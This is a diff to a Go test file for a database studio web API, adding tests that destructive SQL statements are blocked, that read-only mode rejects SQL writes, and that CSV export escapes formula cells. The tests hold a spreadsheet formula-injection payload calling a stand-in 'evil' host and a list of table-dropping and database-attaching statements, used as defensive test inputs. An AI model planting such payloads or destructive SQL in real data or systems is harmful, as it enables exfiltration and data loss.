@@ -5,6 +5,7 @@ import (
 	"encoding/json"
 	"net/http"
 	"net/http/httptest"
+	"strings"
 	"testing"
 
 	"github.com/gin-gonic/gin"
@@ -342,6 +343,25 @@ func TestExecuteSQLWrite(t *testing.T) {
 	}
 }
 
+func TestExecuteSQLBlocksDDL(t *testing.T) {
+	router, _ := setupTestRouter(t)
+
+	ddlStatements := []string{
+		"DROP TABLE test_users",
+		"ALTER TABLE test_users ADD COLUMN foo TEXT",
+		"TRUNCATE TABLE test_users",
+		"CREATE TABLE evil (id int)",
+		"ATTACH DATABASE '/tmp/evil.db' AS evil",
+	}
+
+	for _, stmt := range ddlStatements {
+		w := doRequest(router, "POST", "/studio/api/sql", map[string]interface{}{"query": stmt})
+		if w.Code != http.StatusForbidden {
+			t.Errorf("DDL statement %q should return 403, got %d", stmt, w.Code)
+		}
+	}
+}
+
 func TestExportJSON(t *testing.T) {
 	router, _ := setupTestRouter(t)
 
@@ -376,6 +396,23 @@ func TestExportCSV(t *testing.T) {
 	body := w.Body.String()
 	if len(body) == 0 {
 		t.Error("expected non-empty CSV body")
+	}
+}
+
+func TestExportCSVFormulaInjection(t *testing.T) {
+	router, db := setupTestRouter(t)
+
+	// Insert a row with formula payload
+	db.Exec("INSERT INTO test_users (name, email) VALUES (?, ?)", "=WEBSERVICE(\"http://evil\")", "normal@test.com")
+
+	w := doRequest(router, "GET", "/studio/api/tables/test_users/export?format=csv", nil)
+	if w.Code != http.StatusOK {
+		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
+	}
+
+	body := w.Body.String()
+	if !strings.Contains(body, "'=WEBSERVICE") {
+		t.Errorf("CSV export should prefix formula cells with single quote, got: %s", body)
 	}
 }
 
@@ -421,6 +458,18 @@ func TestReadOnlyMode(t *testing.T) {
 	w = doRequest(router, "DELETE", "/studio/api/tables/test_users/rows/1", nil)
 	if w.Code == http.StatusOK {
 		t.Error("DELETE should not succeed in read-only mode")
+	}
+
+	// SQL write should be blocked in read-only mode
+	w = doRequest(router, "POST", "/studio/api/sql", map[string]interface{}{"query": "DELETE FROM test_users"})
+	if w.Code != http.StatusForbidden {
+		t.Errorf("SQL write should return 403 in read-only mode, got %d", w.Code)
+	}
+
+	// SQL read should still work in read-only mode
+	w = doRequest(router, "POST", "/studio/api/sql", map[string]interface{}{"query": "SELECT * FROM test_users"})
+	if w.Code != http.StatusOK {
+		t.Errorf("SQL read should work in read-only mode, got %d", w.Code)
 	}
 }
 
